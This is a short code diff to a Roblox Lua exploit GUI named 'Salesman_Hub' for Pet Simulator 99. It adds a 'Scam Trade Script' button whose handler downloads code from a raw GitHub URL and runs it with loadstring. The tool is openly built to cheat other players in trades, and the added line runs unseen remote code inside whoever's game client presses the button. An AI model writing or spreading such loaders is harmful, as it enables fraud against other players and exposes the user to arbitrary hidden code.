@@ -2,6 +2,7 @@ local version, changelog = lib:GetInfo()
 local window = lib:CreateWindow("Salesman_Hub  v1")
 local label = lib:CreateLabel(window, "Pets Simulator 99")
 local button = lib:CreateButton(window, "Scam Trade Script", function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/Samyb555/Pet-Simulator-99-/refs/heads/main/Gg.txt."))()
     print(textBox.Text)
 end)
 
